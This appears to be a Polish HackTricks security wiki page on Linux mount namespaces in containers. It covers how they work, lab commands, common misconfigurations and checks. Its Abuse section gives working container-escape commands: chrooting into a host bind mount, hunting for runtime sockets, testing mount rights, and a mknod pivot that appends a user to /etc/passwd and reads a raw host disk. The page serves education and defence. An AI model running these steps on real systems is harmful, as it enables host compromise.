# Przestrzeń nazw montowania

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Przestrzeń nazw montowania kontroluje **tabelę montowań**, którą widzi proces. Jest to jedna z najważniejszych funkcji izolacji kontenerów, ponieważ system plików root, bind mounty, mounty tmpfs, widok procfs, ekspozycja sysfs oraz wiele pomocniczych mountów specyficznych dla danego runtime są reprezentowane właśnie w tej tabeli montowań. Dwa procesy mogą uzyskiwać dostęp do `/`, `/proc`, `/sys` lub `/tmp`, ale to, do czego te ścieżki się odwołują, zależy od przestrzeni nazw montowania, w której się znajdują.

Z perspektywy bezpieczeństwa kontenerów przestrzeń nazw montowania często decyduje o tym, czy mamy do czynienia z „starannie przygotowanym systemem plików aplikacji”, czy z „procesem, który może bezpośrednio widzieć system plików hosta lub na niego wpływać”. Dlatego bind mounty, wolumeny `hostPath`, uprzywilejowane operacje montowania oraz zapisywalne ekspozycje `/proc` lub `/sys` są ściśle związane z tą przestrzenią nazw.

## Działanie

Gdy runtime uruchamia kontener, zwykle tworzy nową przestrzeń nazw montowania, przygotowuje system plików root dla kontenera, montuje procfs i inne pomocnicze systemy plików zgodnie z potrzebami, a następnie opcjonalnie dodaje bind mounty, mounty tmpfs, sekrety, mapy konfiguracji lub ścieżki hosta. Gdy proces działa już wewnątrz tej przestrzeni nazw, zestaw widocznych przez niego mountów jest w dużej mierze niezależny od domyślnego widoku hosta. Host nadal może widzieć rzeczywisty bazowy system plików, ale kontener widzi jego wersję złożoną dla niego przez runtime.

Jest to potężne rozwiązanie, ponieważ pozwala kontenerowi zakładać, że ma własny system plików root, mimo że host nadal wszystkim zarządza. Jest to również niebezpieczne, ponieważ jeśli runtime udostępni niewłaściwy mount, proces nagle uzyska wgląd w zasoby hosta, których pozostałe mechanizmy bezpieczeństwa mogły nie być zaprojektowane do ochrony.

## Lab

Możesz utworzyć prywatną przestrzeń nazw montowania za pomocą:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Jeśli otworzysz inną powłokę poza tą przestrzenią nazw i sprawdzisz tabelę montowań, zobaczysz, że montowanie tmpfs istnieje wyłącznie wewnątrz odizolowanej przestrzeni nazw montowań. Jest to przydatne ćwiczenie, ponieważ pokazuje, że izolacja montowań nie jest abstrakcyjną teorią; kernel dosłownie przedstawia procesowi inną tabelę montowań.

Jeśli otworzysz inną powłokę poza tą przestrzenią nazw i sprawdzisz tabelę montowań, montowanie tmpfs będzie istniało wyłącznie wewnątrz odizolowanej przestrzeni nazw montowań.

W kontenerach szybkie porównanie wygląda następująco:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Drugi przykład pokazuje, jak łatwo konfiguracja runtime może utworzyć ogromną lukę w granicy systemu plików.

## Użycie runtime

Docker, Podman, stosy oparte na containerd oraz CRI-O polegają na prywatnej przestrzeni nazw montowania dla zwykłych kontenerów. Kubernetes korzysta z tego samego mechanizmu w przypadku wolumenów, projected secrets, config maps oraz mountów `hostPath`. Środowiska Incus/LXC również w dużym stopniu polegają na przestrzeniach nazw montowania, szczególnie dlatego, że system containers często udostępniają bogatsze i bardziej zbliżone do maszyn fizycznych systemy plików niż kontenery aplikacyjne.

Oznacza to, że podczas analizy problemu z systemem plików kontenera zwykle nie przyglądasz się osobliwości Dockera. Analizujesz problem z przestrzenią nazw montowania i konfiguracją runtime, wyrażony za pośrednictwem platformy, która uruchomiła workload.

## Błędne konfiguracje

Najbardziej oczywistym i niebezpiecznym błędem jest udostępnienie głównego systemu plików hosta lub innej wrażliwej ścieżki hosta za pomocą bind mountu, na przykład `-v /:/host`, albo użycie zapisywalnego `hostPath` w Kubernetes. W tym momencie pytanie nie brzmi już: „czy kontener może w jakiś sposób uciec?”, lecz raczej: „jak dużo użytecznych danych hosta jest już bezpośrednio widocznych i możliwych do modyfikacji?”. Zapisywalny bind mount hosta często sprowadza resztę exploita do prostego umieszczenia plików, użycia chroot, modyfikacji konfiguracji lub wyszukania socketu runtime.

Innym częstym problemem jest udostępnianie `/proc` lub `/sys` hosta w sposób omijający bezpieczniejszy widok kontenera. Te systemy plików nie są zwykłymi mountami danych; stanowią interfejsy do stanu kernela i procesów. Jeśli workload uzyska bezpośredni dostęp do wersji hosta, wiele założeń stojących za hardeningiem kontenera przestaje mieć zastosowanie.

Znaczenie mają również zabezpieczenia tylko do odczytu. Tylko do odczytu root filesystem nie zabezpiecza magicznie kontenera, ale usuwa dużą ilość miejsca do przygotowania działań przez attackera i utrudnia persistence, umieszczanie helper binaries oraz manipulowanie konfiguracją. Z kolei zapisywalny root lub zapisywalny bind mount hosta daje attackerowi przestrzeń do przygotowania kolejnego kroku.

## Abuse

Gdy przestrzeń nazw montowania jest używana nieprawidłowo, attackerzy zazwyczaj robią jedną z czterech rzeczy. **Odczytują dane hosta**, które powinny pozostać poza kontenerem. **Modyfikują konfigurację hosta** za pośrednictwem zapisywalnych bind mountów. **Montują lub ponownie montują dodatkowe zasoby**, jeśli capabilities i seccomp na to pozwalają. Albo **uzyskują dostęp do potężnych socketów i katalogów stanu runtime**, które pozwalają im poprosić samą platformę kontenerową o większy dostęp.

Jeśli kontener już widzi system plików hosta, cały model bezpieczeństwa natychmiast się zmienia.

Gdy podejrzewasz bind mount hosta, najpierw potwierdź, co jest dostępne i czy można to modyfikować:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Jeśli główny system plików hosta jest zamontowany z uprawnieniami do odczytu i zapisu, bezpośredni dostęp do hosta często jest tak prosty, jak:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Jeśli celem jest uprzywilejowany dostęp runtime zamiast bezpośredniego chrooting, wylicz gniazda i stan runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Jeśli obecne jest `CAP_SYS_ADMIN`, sprawdź również, czy z wnętrza kontenera można tworzyć nowe mounty:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Pełny przykład: pivot `mknod` z dwiema powłokami

Bardziej wyspecjalizowana ścieżka nadużycia pojawia się, gdy root w kontenerze może tworzyć urządzenia blokowe, host i kontener współdzielą tożsamość użytkownika w użyteczny sposób, a attacker ma już foothold z niskimi uprawnieniami na hoście. W takiej sytuacji kontener może utworzyć węzeł urządzenia, taki jak `/dev/sda`, a użytkownik hosta z niskimi uprawnieniami może później odczytać go przez `/proc/<pid>/root/` dla pasującego procesu kontenera.<sup>[[1]](#references)</sup>

Wewnątrz kontenera:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Z hosta, jako odpowiadający mu użytkownik o niskich uprawnieniach, po zlokalizowaniu PID powłoki kontenera:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Ważna lekcja nie dotyczy wyszukiwania dokładnego ciągu CTF. Chodzi o to, że ujawnienie przestrzeni nazw montowania przez `/proc/<pid>/root/` może pozwolić użytkownikowi hosta ponownie wykorzystać węzły urządzeń utworzone przez kontener, nawet gdy zasady urządzeń cgroup uniemożliwiały ich bezpośrednie użycie wewnątrz samego kontenera.<sup>[[1]](#references)</sup>

## Kontrole

Te polecenia mają pokazać widok systemu plików, w którym faktycznie działa bieżący proces. Celem jest znalezienie montowań pochodzących z hosta, wrażliwych ścieżek z prawem zapisu oraz wszystkiego, co wygląda na szersze niż główny system plików zwykłego kontenera aplikacji.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Na co warto tutaj zwrócić uwagę:

- Bind mounts z hosta, szczególnie `/`, `/proc`, `/sys`, katalogi ze stanem runtime lub lokalizacje socketów, powinny od razu zwrócić uwagę.
- Nieoczekiwane mounty read-write są zwykle ważniejsze niż duża liczba pomocniczych mountów read-only.
- `mountinfo` jest często najlepszym miejscem, aby sprawdzić, czy dana ścieżka rzeczywiście pochodzi z hosta, czy jest oparta na overlay.

Te kontrole pozwalają ustalić, **które zasoby są widoczne w tej przestrzeni nazw**, **które z nich pochodzą z hosta** oraz **które są zapisywalne lub wrażliwe z punktu widzenia bezpieczeństwa**.

## References

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
